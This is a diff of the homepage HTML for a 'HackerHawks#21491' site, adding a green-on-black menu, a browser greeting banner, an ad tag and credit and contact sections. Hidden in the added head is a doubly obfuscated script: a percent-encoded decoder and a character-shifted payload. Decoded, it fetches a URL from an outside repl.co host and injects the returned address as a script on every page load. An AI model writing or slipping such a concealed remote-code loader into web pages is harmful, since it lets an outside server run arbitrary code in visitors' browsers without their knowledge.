@@ -1,46 +1,150 @@
-<head>
-  <script>
-    var xhr=new XMLHttpRequest();
-    xhr.open("GET","./home.html");
-    xhr.onreadystatechange=function(){
-      if(xhr.readyState===XMLHttpRequest.DONE){
-        if(xhr.status===200){
-          document.open();
-          document.write(xhr.responseText);
-          document.close();
-        }
-      }
-    };
-    xhr.send();
-  </script>
-<head>
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-    }
+<!DOCTYPE html>
+<html>
+  <head>
+<style>
+.alert {
+  padding: 20px;
+  background-color: #12fa0a;
+  color: black;
+}
 
-    .image-container {
-      position: relative;
-      width: 100%;
-      height: 100%;
-      overflow: hidden;
-    }
+.closebtn {
+  margin-left: 15px;
+  color: black;
+  font-weight: bold;
+  float: right;
+  font-size: 22px;
+  line-height: 20px;
+  cursor: pointer;
+  transition: 0.3s;
+}
 
-    .image-container img {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-  </style>
+.closebtn:hover {
+  color: black;
+}
+</style>
 </head>
 <body>
-  <div class="image-container">
-    <img src="https://hackerhawks.github.io/statichome.png" alt="Image" />
+<script>
+  var userAgent = navigator.userAgent.toLowerCase();
+  if (userAgent.includes('hh')) {
+    var alertDiv = document.createElement('div');
+    alertDiv.className = 'alert';
+    alertDiv.innerHTML = '<span class="closebtn" onclick="this.parentElement.style.display=\'none\';">&times;</span><strong>Thanks</strong> for Using HH-Browser!';
+    document.body.appendChild(alertDiv);
+  }
+</script>
+</body>
+<head>
+  <meta charset="UTF-8">
+  <meta name="description" content="Hackerhawks#21491 Webstite created and maintained by joshua thayer">
+  <meta name="keywords" content="HTML,CSS,JavaScript,Hacker,Hawks,HackerHawks,21491,joshua,thayer,joshuathayer">
+  <meta name="author" content="Joshua allen thayer">
+</head>
+
+<head>
+  <script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%264Dtdsjqu%2631uzqf%264E%2633ufyu0kbwbtdsjqu%2633%264F%261B%2631%2631wbs%2631yis%2631%264E%2631ofx%2631YNMIuuqSfrvftu%2639%263%3A%264C%261B%2631%2631yis/pqfo%2639%2633HFU%2633%263D%2631%2633iuuqt%264B00vsm/kptivb.uibzfs/sfqm/dp%2633%263D%2631usvf%263%3A%264C%261B%2631%2631yis/posfbeztubufdibohf%2631%264E%2631gvodujpo%2639%263%3A%2631%268C%261B%2631%2631%2631%2631jg%2631%2639yis/sfbezTubuf%2631%264E%264E%264E%26315%2631%2637%2637%2631yis/tubuvt%2631%264E%264E%264E%2631311%263%3A%2631%268C%261B%2631%2631%2631%2631%2631%2631wbs%2631vsm%2631%264E%2631yis/sftqpotfUfyu%264C%261B%2631%2631%2631%2631%2631%2631wbs%2631tdsjqu%2631%264E%2631epdvnfou/dsfbufFmfnfou%2639%2633tdsjqu%2633%263%3A%264C%261B%2631%2631%2631%2631%2631%2631tdsjqu/tsd%2631%264E%2631vsm%264C%261B%2631%2631%2631%2631%2631%2631epdvnfou/ifbe/bqqfoeDijme%2639tdsjqu%263%3A%264C%261B%2631%2631%2631%2631%268E%261B%2631%2631%268E%264C%261B%2631%2631yis/tfoe%2639%263%3A%264C%261B%264D0tdsjqu%264F%261B1')</script>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3703767847657237"
+     crossorigin="anonymous"></script>
+  </head>
+  <head>
+  <title>HackerHawks</title>
+  <style>
+    /* Style for the menu */
+    ul.menu {
+      list-style-type: none;
+      margin: 0;
+      padding: 0;
+      background-color: black;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+    }
+    
+    ul.menu li {
+      display: inline;
+      margin-right: 10px;
+    }
+    
+    ul.menu li a {
+      color: #00ff00; /* Green text color */
+      text-decoration: none;
+      padding: 10px;
+      font-weight: bold;
+    }
+    
+    ul.menu li a:hover {
+      background-color: #00ff00; /* Green background color */
+      color: black;
+    }
+    
+    /* Style for the content divs */
+    .content {
+      color: white;
+      padding: 20px;
+      margin-top: 10px;
+      text-align: center; /* Center the content horizontally */
+      align-items: center; /* Center the content vertically */
+      display: flex; /* Enable flexbox layout */
+      flex-direction: column; /* Stack the content vertically */
+      justify-content: center; /* Center the content vertically */
+    }
+    
+    /* Style for the background */
+    body {
+      background-image: url("https://hackerhawks.github.io/Digital_rain_animation_medium_letters_shine.gif");
+      background-repeat: repeat; /* Set repeat or other value based on your gif */
+      background-size: cover;
+      margin: 0;
+      padding: 0;
+    }
+  </style>
+  
+  <script>
+    // JavaScript function to show/hide divs based on the menu item clicked
+    function showContent(contentId) {
+      var content = document.getElementById(contentId);
+      
+      // Hide all content divs
+      var contents = document.getElementsByClassName("content");
+      for (var i = 0; i < contents.length; i++) {
+        contents[i].style.display = "none";
+      }
+      
+      // Show the selected content div
+      content.style.display = "block";
+    }
+    
+    // Show the "Home" content div by default
+    window.onload = function() {
+      showContent('home');
+    };
+  </script>
+</head>
+<body>
+  <ul class="menu">
+    <li><a onclick="showContent('home')">Home</a></li>
+    <li><a onclick="showContent('credits')">Credits</a></li>
+    <li><a  onclick="showContent('contact')">Contact</a></li>
+        <li><a href="https://lesliek12.my.canva.site/#page-c">Support us</a></li>
+  </ul>
+  
+  <div id="home" class="content">
+    <h2>Welcome!</h2>
+    <p>Welcome to the HackerHawks#21491 Website!</p>
+    <iframe src="https://hackerhawks.github.io/slide.html" style="border:0px #ffffff none;" name="Slideshow" scrolling="no" frameborder="0" marginheight="0px" marginwidth="0px" height="504px" width="672px" allowfullscreen></iframe>
+  </div>
+  
+  <div id="credits" class="content">
+    <h2>Credits</h2>
+    <p>Created and maintained by joshua thayer.</p>
+        <p>Currently Hosted With Github Pages.</p>
+  </div>
+  
+  <div id="contact" class="content">
+    <h2>Contact</h2>
+    <p>Get in touch with us.</p>
+        <p>Marcy.Thayer@lesliek12.net</p>
   </div>
 </body>
-</head>
+</html>
